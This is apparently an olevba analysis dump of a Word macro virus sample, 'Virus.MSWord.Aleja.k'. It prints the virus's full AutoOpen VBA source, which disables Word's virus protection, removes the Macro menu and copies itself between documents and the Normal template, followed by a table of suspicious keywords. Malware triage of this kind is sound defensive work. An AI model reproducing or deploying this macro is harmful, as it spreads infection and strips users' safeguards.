olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aleja.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aleja.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Aleja.k - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

On Error Resume Next



Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Delete

Dim modulo(6) As String
Dim n As Integer




n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"


For m = 1 To n

existe = False

For Each VBComponent In NormalTemplate.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next



Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument




End Sub

-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardar.bas 
in file: Virus.MSWord.Aleja.k - OLE stream: 'Macros/VBA/ArchivoGuardar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardarComo.bas 
in file: Virus.MSWord.Aleja.k - OLE stream: 'Macros/VBA/ArchivoGuardarComo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimir.bas 
in file: Virus.MSWord.Aleja.k - OLE stream: 'Macros/VBA/ArchivoImprimir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimirPredeter.bas 
in file: Virus.MSWord.Aleja.k - OLE stream: 'Macros/VBA/ArchivoImprimirPredeter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

